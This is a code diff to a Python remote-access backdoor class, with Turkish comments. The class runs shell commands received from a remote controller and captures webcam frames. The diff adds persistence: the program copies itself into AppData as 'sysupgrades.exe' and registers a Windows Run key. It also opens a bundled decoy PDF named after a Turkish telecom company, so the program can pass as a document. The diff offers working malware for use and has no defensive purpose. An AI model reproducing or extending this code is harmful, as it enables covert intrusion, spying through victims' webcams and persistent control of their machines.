@@ -5,6 +5,8 @@ import base64
 import cv2
 import time
 import os
+import shutil
+import sys
 
 class BackDoor:
     def __init__(self, ip, port):
@@ -25,7 +27,7 @@ class BackDoor:
                 continue
 
     def command_execution(self, command):
-        return subprocess.check_output(command, shell=True)
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
     def exec_cd_command(self, directory):
         os.chdir(directory)
@@ -43,15 +45,29 @@ class BackDoor:
     def capture_webcam(self):
         video_capture = cv2.VideoCapture(0)  # 0, varsayılan kamera için
         frames = []
-        for _ in range(5):
+        for _ in range(3):
             ret, frame = video_capture.read()
             frames.append(frame)
             time.sleep(3)
         video_capture.release()
         return frames
 
+    def add_to_registry(self):
+        new_file = os.environ["appdata"] + "\\sysupgrades.exe"
+        if not os.path.exists(new_file):
+            shutil.copyfile(sys.executable, new_file)
+            regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file    #  dosyanın bulunduğu konum..
+            subprocess.call(regedit_command, shell=True)
+
+    def open_added_file(self): # eğer pdf veya jpeg gibi birşey ile birleştirilecekse birleştirilen dosyanın açılmasını sağlar..
+        added_file = sys._MEIPASS + "\\Turkcell-EFR2020-TR.pdf"
+        subprocess.Popen(added_file, shell=True)
+
+
     def start_backdoor(self):
+        self.open_added_file()
         while True:
+            self.add_to_registry()
             command = self.json_receive()
             try:
                 if command[0] == "quit":
